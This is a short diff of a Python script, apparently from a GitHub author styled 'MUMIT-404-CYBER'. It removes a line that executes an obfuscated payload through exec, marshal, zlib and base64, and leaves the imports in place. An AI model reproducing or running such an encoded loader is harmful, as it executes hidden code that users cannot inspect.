@@ -3,7 +3,7 @@
 #WHATSAPP : +8801641535234
 #GITHUB : https://github.com/MUMIT-404-CYBER
 #----------------------------------------------------------------------------------------------------------
-import os,sys,time,json,random,re,string,platform,base64,uuid,marshal, base64, zlib; exec(marshal.loads(zlib.decompress(base64.b64decode(b'eJx7zIAEmKH0ZxkgMZ2BiSGVIYVhGSMDw2pGmBJGhhTGYAZNplJLIEc62tDa0ig3Gkwb5j6aMxkqEqsQ7BzkGRCi4Bzk6OIZouAb6gskPYN9HH0VPDx9Q/00GW+xFhRl5pWsZPgMMvYXj6efn7+zq1+IgpN/5C8Om9z8lNKcVLsiNrCdDAzFICd9YGZkZLzBwNrAeoHN6yKD9xUG7wswVMQCVAAAK8Mupg=='))))
+import os,sys,time,json,random,re,string,platform,base64,uuid,marshal, base64, zlib; 
 from bs4 import BeautifulSoup as sop
 from bs4 import BeautifulSoup
 import requests as ress
